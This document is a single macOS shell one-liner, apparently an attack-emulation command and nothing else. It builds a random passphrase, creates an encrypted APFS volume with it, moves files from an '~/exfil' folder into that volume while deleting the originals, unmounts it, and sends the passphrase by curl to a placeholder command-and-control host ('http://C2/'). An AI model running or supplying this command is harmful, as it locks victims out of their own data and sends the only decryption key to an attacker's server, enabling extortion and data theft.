sh -c 'p=$(head -n 1024 /dev/urandom | strings| grep -o "[[:alnum:]]" | head -n 64| tr -d "\n"); diskutil apfs addVolume disk1 APFS x -passphrase "$p"; rsync -zvh --remove-source-files ~/exfil/* /Volumes/x; diskutil umount x; curl -0 http://C2/"$p"'
